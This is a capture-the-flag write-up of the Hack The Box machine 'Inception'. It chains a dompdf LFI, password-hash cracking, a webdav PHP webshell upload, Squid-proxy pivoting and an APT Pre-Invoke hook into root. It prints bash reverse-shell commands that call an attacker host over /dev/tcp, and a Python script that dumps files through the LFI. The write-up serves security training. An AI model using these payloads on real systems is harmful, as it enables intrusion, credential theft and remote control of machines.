## Default Information
IP Address: 10.10.10.67\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.67  inception.htb
```
### Masscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.10.67:80
Open 10.10.10.67:3128
```

### Nmap
We will then use the open ports obtained from rustscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80 | http | Apache httpd 2.4.18 ((Ubuntu)) | Open |
| 3128 | http-proxy | Squid http proxy 3.5.12 | Open |

### Web Enumeration
First, we will use gobuster to enumerate the endpoints on http://inception.htb:80. From the output, we notice an interesting endpoint which is http://inception.htb:80/dompdf.

```
http://10.10.10.67:80/LICENSE.txt          (Status: 200) [Size: 17128]
http://10.10.10.67:80/README.txt           (Status: 200) [Size: 2307]
http://10.10.10.67:80/index.html           (Status: 200) [Size: 2877]
http://10.10.10.67:80/assets               (Status: 301) [Size: 311] [--> http://10.10.10.67/assets/]
http://10.10.10.67:80/images               (Status: 301) [Size: 311] [--> http://10.10.10.67/images/]
http://10.10.10.67:80/dompdf               (Status: 301) [Size: 311] [--> http://10.10.10.67/dompdf/]
```

Inspecting the source code of http://inception.htb, we also notice that there is a comment regarding dompdf

```
┌──(kali㉿kali)-[~]
└─$ curl http://inception.htb  
...
<!-- Todo: test dompdf on php 7.x -->
```

Navigating to http://inception.htb/dompdf, we are able to view a directory listing of the files. From there, we are able to find a file named "version". Navigating to http://inception.htb/dompdf/version, we are able to find out that the version of dompdf that is being used would be 0.6.0
![Version of dompdf used](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/dompdf_version.png)

## Exploit
### LFI on dompdf
Looking up exploitdb, we can see from [here](https://www.exploit-db.com/exploits/33004) that there is an LFI exploit for dompdf 0.6.0.

Let us try to read the /etc/passwd file using the LFI vulnerability that we have found. To do so, we will send a GET request to http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd. From the response, we are able to find a base64-encoded text which decodes to be the contents of the /etc/passwd file. 

![Demonstrating LFI](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/lfi.png)

Since we can do an LFI exploit, we will attempt to escalate the LFI exploit to become an rce using /proc/self/environ or /proc/*/fd. Unfortunately, both of them returns a status code 500 and we are unable to exploit it. 

![Attempting to exploit LFI using /proc/self/environ](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/lfi_proc_self_environ.png)
![Attempting to exploit LFI using /proc/1/fd](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/lfi_proc_1_fd.png)

Next, we will use a python script to save the list of linux files from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt) to our local directory. We will then inspect the files in detail to check for any potential exploitation.

Looking at the /etc/passwd file that we have extracted using the LFI vulnerability on the website, we can know that there is a user ```cobb``` on the server.

```
/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

Looking at the /etc/apache2/sites-enabled/000-default.conf file that we have extracted from the website using the LFI vulnerability, we are able to obtain another endpoint ```/webdav_test_inception```. From the configuration file, we are also able to obtain the location of the authentication file to be at /var/www/html/webdav_test_inception/webdav.passwd

```
Alias /webdav_test_inception /var/www/html/webdav_test_inception
<Location /webdav_test_inception>
	Options FollowSymLinks
	DAV On
	AuthType Basic
	AuthName "webdav test credential"
	AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
	Require valid-user
</Location>
```

### Exploiting webdav
Navigating to http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd, we are able to obtain the base64-encoded value of a password hash

![Obtaining password hash](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/password_hash.png)

Using hashid, we recognize the hash type as MD5(APR). From the output, we can obtain the decoded value as ```babygurl69```

```
┌──(kali㉿kali)-[~]
└─$ hashid '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0'              
Analyzing '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0'
[+] MD5(APR) 
[+] Apache MD5 
```

Next, we will use hashcat to crack the hash

```
┌──(kali㉿kali)-[~/Desktop/inception]
└─$ hashcat -m 1600 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
...
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
...
```

### Exploiting webdav
Next, we will use davtest to test the webdav service found on http://inception.htb/webdav_test_inception.  From the output, we can see that we can upload a php web shell and execute commands on the php webshell.

```            
┌──(kali㉿kali)-[~/Desktop/inception]
└─$ davtest -url http://inception.htb/webdav_test_inception -auth webdav_tester:babygurl69
********************************************************
 Checking for test file execution
EXEC    html    SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.html
EXEC    shtml   FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.php
EXEC    jhtml   FAIL
EXEC    asp     FAIL
EXEC    cfm     FAIL
EXEC    aspx    FAIL
EXEC    cgi     FAIL
EXEC    txt     SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.txt
EXEC    pl      FAIL

********************************************************
```

Next, we will use the ```curl``` command to upload a php webshell onto the website.

```
┌──(kali㉿kali)-[~/Desktop/inception]
└─$ curl -X PUT http://webdav_tester:babygurl69@inception.htb/webdav_test_inception/shell.php -d @shell.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at inception.htb Port 80</address>
</body></html>
```

### Exploiting webshell
Afterwards, we will try to create a reverse shell connection using ```/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.6/4000 0>&1'``` as the payload. However, it seems that we are unable to create a reverse shell connection. 

Let us verify with a ping commad to check if we can reach our local machine. From the output, we noticed that we are unable to reach our IP address. It is likely that there is a firewall or IP rules that prevent outbound connections.

![Ping command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/ping.png)

Let us try to extract the user flag using ```cat /home/cobb/user.txt```. However, this does not return any flag for us. It might be due to the fact that the web user does not have the sufficient privileges to access the user flag in /home/cobb

![Attemping to obtain user flag from webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/webshell_user_flag.png)

Listing out the directories in /var/www/html using ```ls /var/www/html```, we can find a ```wordpress_4.8.3``` directory. Furthur on, listing the ```wordpress_4.8.3``` directory reveals a wp-config.php file. We shall then proceed to view the contents of the wp-config.php file using ```cat /var/www/html/wordpress_4.8.3/wp-config.php```

Viewing the contents of the wp-config.php file, we are able to discover a password ```VwPddNh7xMZyDQoByQL4```. 

![Obtaining password from wp-config.php file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/wp_password.png)

### Exploiting Squid Proxy
After obtaining the password, we realize that we are unable to find anywhere to use the password on. Let us use the ```netstat -an``` command to find any internal service that is running which we might be able to make use of. From the output, we can see that port 22 is running in the internal IP but not exposed to the external service.

![Finding SSH service on the internal IP](https://github.com/joelczk/writeups/blob/main/HTB/Images/Inception/ssh.png)

However, we know that the Squid proxy is open on port 3128. This means that we can make use of the Squid proxy to access the service on the internal IP address of this machine. 

To do so, we will have to first modify the /etc/proxychains4.conf file on our local machine to add the Squid proxy.

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
http 10.10.10.67 3128
```

Using proxychains, we are then able to gain SSH access as cobb user

```
┌──(kali㉿kali)-[/etc]
└─$ proxychains ssh cobb@127.0.0.1                                                                 2 ⚙
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
cobb@127.0.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ 
```
### Obtaining user flag

```
cobb@Inception:~$ cat user.txt
<Redacted user flag>
```

### Privilege Escalation to root
Using the ```sudo -l``` command, we realize that we can execute any commands with root privileges.

```
cobb@Inception:/tmp$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```

Next, we will use ```sudo su``` to escalate our privileges to become root

```
cobb@Inception:/tmp$ sudo su
root@Inception:/tmp# 
```

However, what we realize is that we are still unable to get the root flag. The /root/root.txt file does give us a hint as shown below.

```
root@Inception:/tmp# cat /root/root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```

### Network Enumeration
Given that we can easily run ```sudo``` on any commands with the cobb user and that the flag cannot be found, I suspect that we are in a container. 

Using the ```df -h``` command, we can see that we are currently being mounted on a lxd container. 

```
root@Inception:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        19G  2.9G   15G  17% /
none            492K     0  492K   0% /dev
udev            477M     0  477M   0% /dev/tty
tmpfs           100K     0  100K   0% /dev/lxd
tmpfs           100K     0  100K   0% /dev/.lxd-mounts
tmpfs           497M   12K  497M   1% /dev/shm
tmpfs           497M  6.4M  490M   2% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           497M     0  497M   0% /sys/fs/cgroup
```

Since we know that we are in a container and that we are unable to transfer files over to the linux machine as the outgoing packets are dropped, we will do a ping sweep of the subnet to find the IP addresses in the subnet.

From the output, we are able to find the IP address of the subnet as 192.168.0.1

```
root@Inception:/# for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.023 ms
root@Inception:/# 
```

Next, let us use ```nc``` to identify the open TCP ports on this machine. From the output, we can see that we have both port 21 and port 22 that are open on this machine. 

```
root@Inception:/# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
```

Afterwards, let us use ```nc``` again to identify the open UDP ports on this machine. 

```
root@Inception:/# nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 53 port [udp/domain] succeeded!
Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
root@Inception:/# 
```

### Exploiting FTP on 192.168.0.1
Let us first try to do an anonymous login on the FTP on port 21 in 192.168.0.1

```
root@Inception:/# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

We realized that we are unable to write files using FTP as we do not have the permissions to do so. 

```
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

However, we realize that we are able to download files using FTP. Using this, we can download the ```crontab`` file from the /etc directory

In the /etc directory, we realize that we do not have the permissions to download the cron.d file, but we are able to download the crontab file

```
ftp> get cron.d
local: cron.d remote: cron.d
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> get cron.daily
local: cron.daily remote: cron.daily
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (826 bytes).
226 Transfer complete.
826 bytes received in 0.00 secs (15.7547 MB/s)
```

Inspecting the downloaded crontab file, we realize that there is a ```apt upgrade``` that is being executed every 5 mins

```
root@Inception:/tmp# cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
```

We are also able to find a tptpd-hpa file in the /etc/default directory. We will then download the file to the machine and inspect the contents.

```
ftp> cd /etc
250 Directory successfully changed.
ftp> cd default
250 Directory successfully changed.
ftp> get tftpd-hpa
local: tftpd-hpa remote: tftpd-hpa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
226 Transfer complete.
118 bytes received in 0.00 secs (1.3239 MB/s)
ftp> 
```

### Exploiting TFTP
We realize that we can authenticate to tftp without any credentials. However, we notice that tftp does not have the ability to list out files and directories.

```
root@Inception:/tmp# tftp 192.168.0.1
tftp> ls
?Invalid command
```

Next, we will try if tftp has the ability to write files. We notice that the write operation is successful and listing the /home directory using the FTP service, we realize that the test.txt file has been written in the /home directory.

```
tftp> put test.txt /home/test.txt
Sent 6 bytes in 0.0 seconds
------------------------------------------------
root@Inception:/tmp# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-rw-    1 0        0               5 May 27 03:35 test.txt
226 Directory send OK.
ftp> 
```

### Exploiting apt update
Using the tutorial from [here](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/), we can hook a script command during the ```apt update```. Since we know that ```apt update``` command runs every 5mins, we can use this exploit to create a reverse shell

Next, we will craft a reverse shell command and save the file in the /tmp directory

```
root@Inception:/tmp# cat exploit
APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/10.10.16.6/4000 0>&1'"}
```

Next, we will move the exploit script to the /etc/apt/apt.conf.d/ directory using tftp

```
tftp> put /tmp/exploit /etc/apt/apt.conf.d/exploit 
Sent 80 bytes in 0.0 seconds
```

After a while, when the ```apt update``` runs, the script will be executed and there will be a reverse shell connection to our local machine
### Obtaining root flag
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000       
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.67] 57166
bash: cannot set terminal process group (4595): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
root@Inception:/tmp# 
```
## Post-Exploitation
### Script for LFI

```
import requests
import base64

def getBase64(text):
    output = text.split(" ")
    for x in output:
        if "[(" in x:
            base64_text = x.replace("[(","").replace(")]","")
            decoded_text = base64.b64decode(base64_text).decode('utf-8')
            return decoded_text

def exploit(url, filename):
    try:
        url = url + filename
        r = requests.get(url)
        data = str(r.text)
        output = data.split("\n")
        for x in output:
            if "Tf" in x:
                return getBase64(x)
            else:
                continue
    except:
        return None

def main(url):
    filenames = open("lfi.txt").readlines()
    number = 0
    for filename in filenames:
        filename = filename.strip()
        decoded_text = exploit(url, filename)
        if decoded_text is None:
            continue
        outputfilename = "files/{number}".format(number=str(number))
        outputfile = open(outputfilename,'a')
        outputfile.write(filename)
        outputfile.write("\n")
        outputfile.write(decoded_text)
        print("[*] {filename} saved to {outputfilename}".format(filename=filename,outputfilename=outputfilename))
        number += 1
        outputfile.close()

if __name__ == '__main__':
    url = "http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource="
    main(url)
```

### Verifying that we are in a container
Using the ```ls -la``` command, we are unable to find a .dockerenv file that tells us that we are in a container

```
root@Inception:/# ls -la
total 68
drwxr-xr-x  21 root   root    4096 Nov  1  2017 .
drwxr-xr-x  21 root   root    4096 Nov  1  2017 ..
drwxr-xr-x   2 root   root    4096 Nov  6  2017 bin
drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot
drwxr-xr-x   9 root   root     500 May 27 02:15 dev
drwxr-xr-x  75 root   root    4096 Nov  6  2017 etc
drwxr-xr-x   3 root   root    4096 Nov  6  2017 home
drwxr-xr-x  11 root   root    4096 Oct 27  2017 lib
drwxr-xr-x   2 root   root    4096 Oct 27  2017 lib64
drwxr-xr-x   2 root   root    4096 Oct 27  2017 media
drwxr-xr-x   2 root   root    4096 Oct 27  2017 mnt
drwxr-xr-x   2 root   root    4096 Oct 27  2017 opt
dr-xr-xr-x 199 nobody nogroup    0 May 27 02:15 proc
drwx------   2 root   root    4096 Nov  8  2017 root
drwxr-xr-x  16 root   root     520 May 27 02:19 run
drwxr-xr-x   2 root   root    4096 Nov  6  2017 sbin
drwxr-xr-x   2 root   root    4096 Nov  6  2017 srv
dr-xr-xr-x  13 nobody nogroup    0 May 27 02:25 sys
drwxrwxrwt   7 root   root    4096 May 27 02:17 tmp
drwxr-xr-x  10 root   root    4096 Oct 27  2017 usr
drwxr-xr-x  12 root   root    4096 Nov  6  2017 var
```

Furthurmore, using ```hostname``` only tells us that the container's name is Inception and does not reveal anymore information.

```
root@Inception:/# hostname
Inception
root@Inception:/# 
```

However, using ```ifconfig``` reveals an IP address(192.168.0.10) that is different from the IP address of this machine. This tells us that we are in a container.

```
root@Inception:/# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1092 errors:0 dropped:0 overruns:0 frame:0
          TX packets:743 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:94446 (94.4 KB)  TX bytes:102417 (102.4 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1988 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1988 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:182647 (182.6 KB)  TX bytes:182647 (182.6 KB)

```
